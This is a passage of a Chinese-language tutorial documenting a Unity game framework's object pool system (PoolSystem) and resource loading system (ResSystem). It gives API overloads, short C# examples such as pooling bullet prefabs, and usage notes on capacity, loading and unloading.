<p>本框架提供对象池容量的限制，且初始化时，可以预先传入要放入的对象根据默认容量实例化放入对象池，比如场景中默认使用20发子弹，可以在对象池初始化时就实例化好20枚子弹放入对象池。</p>
<p>如有特殊需求，可以通过持有PoolMoudle层来单独构建一个不同于全局对象池PoolSystem的Pool，默认正常情况下使用全局对象池PoolSystem即可。</p>
<h3 data-id="heading-2">GameObject对象池（GOP）</h3>
<p>用于管理实际存在场景中并出现在Hierarchy窗口上的GameObject对象。</p>
<h4 data-id="heading-3">初始化GOP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1,GameObject prefab = null,int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, prefab, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName);
<span class="hljs-comment">//根据prefab.name初始化GOP</span>
<span class="hljs-comment">//  //(GameObject prefab = null, int maxCapacity = -1,GameObject prefab = null,int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab, maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(prefab);
<span class="hljs-comment">//根据GameObject数组大小进行默认容量设置，并将数组对象作为默认对象全部置入对象池</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, GameObject[] gameObjects = null)</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, gameObject);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池，最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
PoolSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入prefab根据prefab.name 指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>初始化并不向构建出的空对象池填入内容，但可通过prefab和defaultQuanity设置默认容量填充空对象池（初始化时会自动按默认容量和最大容量的最小值自动生成GameObject放入对象池）。</li>
<li>可通过传入GameObject数组初始化对象池的默认容量并放入对象填充空对象池。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
</ul>
<h4 data-id="heading-4">将对象放入GOP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName/obj.name放入对象池</span>
<span class="hljs-comment">//(string assetName, GameObject obj)</span>
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>(keyName, obj);
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>(obj);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//将一个子弹对象bullet放入Bullet对象池</span>
PoolSystem<span class="hljs-selector-class">.PushGameObject</span>("Bullet", bullet);


<span class="hljs-comment">// 扩展方法</span>
bullet<span class="hljs-selector-class">.GameObjectPushPool</span>();
</code></pre>
<ul>
<li>通过keyName指定对象池名字放入对象obj，keyName不填则默认对象池名字为obj.name。</li>
<li>封装了拓展方法，可以通过对象.GameObjectPushPool()简便地将GameObject放入对象池。</li>
</ul>

<ul>
<li>可以使用拓展方法直接将对象放入同名对象池内。</li>
<li>如果传入的keyName/prefab找不到对应的对象池（未Init），则会直接初始化生成一个同名的，无限容量的对象池并放入本次对象。</li>
<li>obj为null时本次放入操作无效，会进行报错提示。</li>
</ul>
<h4 data-id="heading-5">将对象从GOP中取出</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName加载GameObject</span>
<span class="hljs-comment">//(string keyName, Transform parent)</span>
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>(keyName, parent);
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>(keyName);
<span class="hljs-comment">//根据keyName和T加载GameObject并获取组件，返回值类型为T</span>
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>&lt;T&gt;(keyName, parent);
PoolSystem<span class="hljs-selector-class">.GetGameObject</span>&lt;T&gt;(keyName);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//将一个子弹对象从对象池中取出</span>
GameObject bullet = PoolSystem<span class="hljs-selector-class">.GetGameObject</span>("Bullet");
<span class="hljs-comment">//将一个子弹对象从对象池中取出并获取其刚体组件</span>
GameObject bullet = PoolSystem<span class="hljs-selector-class">.GetGameOjbect</span>&lt;Rigidbody&gt;("Bullet");
</code></pre>
<ul>
<li>通过keyName指定对象池名字取出GameObject对象并设置父物体为parent，parent不填则默认无父物体在最顶层。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
</ul>

<ul>
<li>当某个对象池内无对象时，其对象池仍会被保存，只有通过Clear才能彻底清空对象池。</li>
<li>当对象池中无对象仍要取出时，会返回null。</li>
</ul>
<h4 data-id="heading-6">清空GOP对象池</h4>
<pre><code class="hljs language-arduino" lang="arduino"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//清空（GameObject/Object）对象池</span>
<span class="hljs-comment">//(bool clearGameObject = true, bool clearCSharpObject = true)</span>
PoolSystem.<span class="hljs-built_in">ClearAll</span>(<span class="hljs-literal">true</span>, <span class="hljs-literal">false</span>);
<span class="hljs-comment">//清空GameObject类对象池中keyName索引的对象池</span>
<span class="hljs-comment">//(string assetName)</span>
PoolSystem.<span class="hljs-built_in">ClearGameObject</span>(keyName);


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//清空所有GOP对象池</span>
PoolSystem.<span class="hljs-built_in">ClearAll</span>(<span class="hljs-literal">true</span>,<span class="hljs-literal">false</span>);
<span class="hljs-comment">//清空Bullet对象池</span>
PoolSystem.<span class="hljs-built_in">ClearGameObject</span>(<span class="hljs-string">"Bullet"</span>);
</code></pre>
<ul>
<li>ClearAll方法用于清空所有GOP/OP对象池，两个bool参数是否清空GOP、是否清空OP。</li>
<li>清空某一类GOP通过传入keyName对象池名索引。</li>
</ul>

<ul>
<li>清空所有对象池时（ClearAll），所有资源都会被释放。</li>
<li>清空某一类对象池时,GameObject中的数据载体和根节点会被放回对象池重复利用（使用时无需关心，底层实现）。</li>
</ul>
<h3 data-id="heading-7">Object对象池（OP）</h3>
<p>用于管理脚本类对象等非游戏物体对象，OP的API和GOP类似，只不过在传参部分OP支持更多方式</p>
<h4 data-id="heading-8">初始化OP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>); <span class="hljs-comment">//对象池名为myData</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>); <span class="hljs-comment">//对象池池名为Data</span>
PoolSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType()); <span class="hljs-comment">//对象池名为xx的类型名</span>
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字，优先使用keyName，在没有keyName的情况下以T类型名作为对象池名称。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成Object放入对象池），对应GameObject通过prefab和defaultQuanity设置默认容量。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>OP的初始化和GOP略有不同，使用了泛型T传递类型，参数列表更加精简，但只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h4 data-id="heading-9">将对象放入OP</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName/obj.getType().FullName即obj对应的类型名放入对象池</span>
<span class="hljs-comment">//(object obj, string keyName)</span>
PoolSystem<span class="hljs-selector-class">.PushObject</span>(obj, keyName);
PoolSystem<span class="hljs-selector-class">.PushObject</span>(obj);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">//将一个Data数据类对象data放入Data对象池</span>
PoolSystem<span class="hljs-selector-class">.PushObject</span>(data, "Data";
PoolSystem.PushObject(data);


<span class="hljs-comment">// 扩展方法</span>
bullet<span class="hljs-selector-class">.ObjectPushPool</span>();
</code></pre>
<ul>
<li>通过keyName指定对象池名字放入对象obj，keyName不填则默认对象池名字为obj.name。</li>
<li>封装了拓展方法，可以通过对象.GameObjectPushPool()简便地将GameObject放入对象池。</li>
<li>可以使用拓展方法直接将对象放入同名对象池内。</li>
<li>如果传入的keyName/obj找不到对应的对象池（未Init），则会直接初始化生成一个同名的，无限容量的对象池并放入本次对象。</li>
<li>obj为null时本次放入操作无效,会进行报错提示。</li>
</ul>
<h4 data-id="heading-10">将对象从OP中取出</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName返回System.object类型对象</span>
<span class="hljs-comment">//(string keyName)</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>(keyName);
<span class="hljs-comment">//根据keyName返回T类型的对象</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T类型名称返回对象</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;T&gt;();
<span class="hljs-comment">//根据type类型名返回对象</span>
<span class="hljs-comment">//(System.Type type)</span>
PoolSystem<span class="hljs-selector-class">.GetObject</span>(xx.getType());




<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//将一个Data数据类对象data从对象池中取出</span>
Data data = PoolSystem<span class="hljs-selector-class">.GetObject</span>("Data");
Data data = PoolSystem<span class="hljs-selector-class">.GetObject</span>&lt;Data&gt;();
</code></pre>
<ul>
<li>通过keyName，泛型T，type类型指定对象池名字取出Object对象。</li>
<li>优先根据keyName索引，不存在keyName时，则通过泛型T的反射类型和type类型名索引</li>
</ul>

<ul>
<li>推荐使用泛型方法，否则返回值是object类型还需要手动进行转换。</li>
</ul>
<h4 data-id="heading-11">清空OP对象池</h4>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//清空（GameObject/Object）对象池</span>
<span class="hljs-comment">//(bool clearGameObject = true, bool clearCSharpObject = true)</span>
PoolSystem<span class="hljs-selector-class">.ClearAll</span>(false, true);
<span class="hljs-comment">//清空Object类对象池下keyName/T类型名/type类型名对象池</span>
<span class="hljs-comment">//(string keyName)</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>(keyName);
PoolSystem<span class="hljs-selector-class">.ClearObject</span>&lt;T&gt;();
<span class="hljs-comment">//(System.Type type)</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>(xx.getType());


<span class="hljs-comment">//简单实例</span>
<span class="hljs-comment">//清空所有OP对象池</span>
PoolSystem<span class="hljs-selector-class">.ClearAll</span>(false,true);
<span class="hljs-comment">//清空Data对象池</span>
PoolSystem<span class="hljs-selector-class">.ClearObject</span>("Data");
PoolSystem<span class="hljs-selector-class">.ClearObject</span>&lt;Data&gt;();
</code></pre>
<ul>
<li>ClearAll方法用于清空所有GOP/OP对象池，两个bool参数是否清空GOP、是否清空OP。</li>
<li>清空某一类OP通过传入keyName/泛型T的反射类型名/type类型名索引。</li>
</ul>

<ul>
<li>清空所有对象池时（ClearAll），所有资源都会被释放。</li>
<li>清空某一类对象池时,Object中的数据载体会被放回对象池重复利用（使用时无需关心，底层实现）。</li>
</ul>
<h3 data-id="heading-12">对象池可视化</h3>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a1bd578e2ace4f2caa8168991bff5f07~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=MI1i3WXu02d4bjEqZ8Vnmki5%2F%2F4%3D" alt="alt" loading="lazy"/>​</p>
<p>可以通过PoolSystemViewer观察OP和GOP。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dbc55580ce2042dcb64e6b9962e57205~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=vlRib8HjvMJGorzzS6eUgGeGK5k%3D" alt="alt" loading="lazy"/>​</p>
<h3 data-id="heading-13">注意</h3>
<ul>
<li>对象池的名字可以和放入的对象名字不同，并且每一个放入对象池的对象名词也可以不同（只要类型一致），但为了避免混淆，我们推荐同名（同类名或者同GameObject名）或者使用配置、枚举来记录对象池名。</li>
<li>PoolSystem可以直接使用，但大多情况下，推荐使用ResSystem来获取GameObject/Object对象来保证返回值不为null。</li>
</ul>
<h2 data-id="heading-14">资源系统</h2>
<p>资源系统实现了Unity资源、游戏对象、类对象的获取、异步加载，并在加载游戏对象和类对象资源时优先从对象池中获取资源来优化性能，若对象池不存在对应资源再通过资源加载方法进行实例化（因为在直接使用对象池时，返回值允许为null，但）。提供Resources和Addressables两种版本:</p>
<ul>
<li>Resources版本，关联对象池进行资源的加载、卸载。</li>
<li>Addressables版本，除关联对象池进行资源的加载、卸载外，结合事件工具实现对象Destroy时Adressables自动unload。</li>
</ul>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/de5b2be94089408ab014b0b065ede8b2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg55So5oi3ODkyMjU0MTE4MjkwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764480691&amp;x-signature=80JL9YOMV6T2WzZc6vbDbixOZoo%3D" alt="alt" loading="lazy"/>​</p>
<p>两种版本在框架设置里进行切换，。</p>
<h3 data-id="heading-15">Resources版本</h3>
<h4 data-id="heading-16">普通类对象(obj)</h4>
<p>类对象资源不涉及异步加载、Resources和Addressables的区别，直接走对象池系统。</p>
<h5 data-id="heading-17">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem一致。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName初始化OP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(keyName);
<span class="hljs-comment">//根据T的类型名初始化OP</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity, defaultQuanity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;(maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;T&gt;();
<span class="hljs-comment">//根据keyName初始化OP，不考虑默认容量，无需传T</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(keyName);
<span class="hljs-comment">//根据type类型名初始化OP</span>
<span class="hljs-comment">//System.Type type, int maxCapacity = -1</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(type);


<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个Data数据类对象池，最大容量30,默认填满</span>
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;("myData",<span class="hljs-number">30</span>,<span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>&lt;Data&gt;(<span class="hljs-number">30</span>, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitObjectPool</span>(xx.GetType());
</code></pre>
<ul>
<li>通过keyName或者直接传入T根据T的类型名指定对象池的名字。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过T和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成T类型的对象放入对象池）。</li>
<li>泛型T起两个作用，一个是不指定keyName时用于充当type名称，另一个是进行默认容量设置时指定预先放入对象池的对象类型，所以如果不想用默认容量功能可以使用不传T的API。</li>
<li>maxCapacity, prefab, defaultQuantity可不填，默认无限容量maxCapacity = -1，不预先放入对象，prefab = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>只有有泛型参数的重载方法可以进行默认容量的初始化（需要指定泛型T进行类型转换）。</li>
<li>可以选择通过传入某个实例的type类型，初始化同名的无限容量OP。</li>
</ul>
<h5 data-id="heading-18">obj加载</h5>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// API</span>
<span class="hljs-comment">//根据keyName从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-comment">//string keyName</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;(keyName);
<span class="hljs-comment">//根据T类型名从对象池中获取一个T类型对象，没有则new</span>
<span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">T</span>&gt;();


<span class="hljs-comment">//简单示例,获取Data数据类的一个对象</span>
<span class="hljs-type">GameObject</span> go1 <span class="hljs-operator">=</span> <span class="hljs-type">ResSystem</span>.<span class="hljs-type">GetOrNew</span>&lt;<span class="hljs-type">Data</span>&gt;(<span class="hljs-string">"Data"</span>);
</code></pre>
<ul>
<li>通过keyName指定加载的类对象名，不填keyName则按照T的类型名加载。</li>
</ul>

<ul>
<li>加载时优先通过对象池获取，如果对象池中无对应资源，自动new一个类对象返回，保证返回值不为null,这点体现了资源系统比对象池更完善，对象池get不存在的obj资源返回Null。</li>
</ul>
<h5 data-id="heading-19">obj卸载</h5>
<p>卸载obj即将obj放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/obj类型名将obj放回对象池</span>
<span class="hljs-comment">//object obj, string keyName</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj);
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(obj, string keyName);


<span class="hljs-comment">//简单示例，卸载Data类的对象data</span>
ResSystem<span class="hljs-selector-class">.PushObjectInPool</span>(data, "Data");
</code></pre>
<ul>
<li>通过obj指定卸载的对象，keyName指定对象池名，不填则按照obj的类型名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将obj放入，保证对象卸载成功,这点体现了资源系统比对象池更完善，对象池push未初始化的对象池资源会报错。</li>
</ul>
<h4 data-id="heading-20">游戏对象（GameObject）</h4>
<h5 data-id="heading-21">初始化</h5>
<p>资源系统的底层基于对象池系统，所以在资源系统层面也开放对对象池的初始化设置，API和PoolSystem大体一致，在prefab部分传参略有不同，通过传Resources下对应的路径由资源系统获得预制体，并克隆出来放入对象池。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName初始化GOP</span>
<span class="hljs-comment">//(string keyName, int maxCapacity = -1, string assetPath = null, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity, assetPath, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(keyName);
<span class="hljs-comment">//根据assetPath切割的资源名初始化GOP</span>
<span class="hljs-comment">//(string assetPath, int maxCapacity = -1, int defaultQuantity = 0)</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath, maxCapacity, defaultQuantity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath, maxCapacity);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(string assetPath);




<span class="hljs-comment">//简单示例</span>
<span class="hljs-comment">// 设定一个子弹Bullet对象池（假设Bullet的路径在Resources文件夹下），最大容量30,默认填满</span>
Gameobject bullet = GameObject<span class="hljs-selector-class">.Find</span>("bullet");
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>("Bullet", <span class="hljs-number">30</span>, bullet, <span class="hljs-number">30</span>);
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(bullet, <span class="hljs-number">30</span>, <span class="hljs-number">30</span>);


<span class="hljs-comment">//最简形式</span>
ResSystem<span class="hljs-selector-class">.InitGameObjectPool</span>(“对象池名字”);
</code></pre>
<ul>
<li>通过keyName或者直接传入assetPath(完整资源路径)根据切割的资源名指定对象池的名字。</li>
<li>传入的assetPath会自动切割获得资源名。</li>
<li>可设置对象池最大容量maxCapacity（超过maxCapacity再放入对象会被Destroy掉）。</li>
<li>可通过assetPath获取的资源和defaultQuanity设置默认容量（初始化时会自动按默认容量和最大容量的最小值自动生成GameObject放入对象池）。</li>
<li>默认无限容量maxCapacity = -1，不预先放入对象，assetPath = null， defaultQuantity = 0。</li>
<li>defaultQuantity必须小于maxCapacity且如果想使用defaultQuantity则必须填入maxCapacity。</li>
</ul>

<ul>
<li>可以通过重复初始化一个对象池的maxCapacity实现容量的更改，此时如果重新指定了defaultQuanity，则会补齐差量个数的对象进对象池。</li>
<li>注意加载到内存的对象在被实例化之后会被自动释放。</li>
</ul>
<h5 data-id="heading-22">GameObject加载并实例化</h5>
<pre><code class="hljs language-ini" lang="ini">//API
//加载游戏物体
//(string assetPath, Transform <span class="hljs-attr">parent</span> = null,string keyName=null)
ResSystem.InstantiateGameObject(assetPath, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetPath, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(assetPath)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject(parent, keyName)<span class="hljs-comment">;</span>
//加载游戏物体并获取组件T
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(assetPath)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObject&lt;T&gt;(parent, keyName)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体
//(string path, Action&lt;GameObject&gt; <span class="hljs-attr">callBack</span> = null, Transform parent = null, string keyName = null)
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath, Action&lt;GameObject&gt; callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync(assetPath)<span class="hljs-comment">;</span>
//异步加载(void)游戏物体并获取组件T
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack, parent, keyName)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack, parent)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath, Action&lt;GameObject&gt; callBack)<span class="hljs-comment">;</span>
ResSystem.InstantiateGameObjectAsync&lt;T&gt;(assetPath)<span class="hljs-comment">;</span>


//简单示例
//实例化一个子弹对象（假设Bullet路径在Resources下）
GameObject <span class="hljs-attr">bullet</span> = ResSystem.InstantiateGameObject(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//实例化一个子弹对象取出并获取其刚体组件
Rigidbody <span class="hljs-attr">rb</span> = ResSystem.InstantiateGameObject&lt;Rigidbody&gt;(<span class="hljs-string">"Bullet"</span>)<span class="hljs-comment">;</span>
//异步实例化一个子弹对象,并在其加载完后坐标归零
void getBullet(GameObject bullet)
{
    <span class="hljs-attr">bullet.transform.position</span> = Vector3.zero<span class="hljs-comment">;</span>
    }
ResSystem.InstantiateGameObjectAsync("Bullet", getBullet)<span class="hljs-comment">;</span>
</code></pre>
<ul>
<li>通过assetPath加载游戏物体并实例化返回。</li>
<li>实例化的游戏物体会设置父物体为parent，不填则默认为null无父物体在最顶层。</li>
<li>实例化的物体名称优先为keyName，keyName为null时则为assetName。</li>
<li>优先根据keyName从对象池获取，不填keyName则根据path加载的资源名在对象池中查找。</li>
<li>对象池中找不到根据assetpath走Resources加载出对象，不填assetPath时则通过keyName查询路径加载对象。</li>
<li>可以通过传参获取对象上的某个组件，组件依托于GameObject存在，因此物体此时也已被从对象池中取出。</li>
<li>异步加载游戏物体及其组件的方法返回值为void类型，无法即时快速加载的游戏物体，需要通过callback回调函数获取加载的GameObject对象并进行使用。</li>
</ul>

<ul>
<li>资源系统如果资源路径正确，则返回值必不为空，优先从对象池中获取，对象池中不存在则根据Load的对象进行实例化返回。</li>
</ul>
<h5 data-id="heading-23">GameObject卸载</h5>
<p>卸载GameObject即将GameObject放回对象池进行资源回收。</p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">//API</span>
<span class="hljs-comment">//根据keyName/gameObject.name回收gameObject</span>
<span class="hljs-comment">//string keyName, GameObject gameObject</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(string keyName, gameObject);
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(gameObject);




<span class="hljs-comment">//简单示例，卸载子弹对象bullet</span>
ResSystem<span class="hljs-selector-class">.PushGameObjectInPool</span>(bullet, "Bullet");
</code></pre>
<ul>
<li>通过gameObject指定卸载的对象，keyName指定对象池名，不填则按照gameObject的对象名卸载。</li>
</ul>

<ul>
<li>卸载对象时如果没有初始化过对象池，则对应自动创建一个同名无限量对象池并将gameObject放入。</li>
</ul>
<h4 data-id="heading-24">Unity资源</h4>
<p>这类资源不需要进行实例化，所以不需要过对象池，只需要直接使用数据或者引用，比如AudioClip，Sprite，prefab。</p>
<h5 data-id="heading-25">加载Asset</h5>
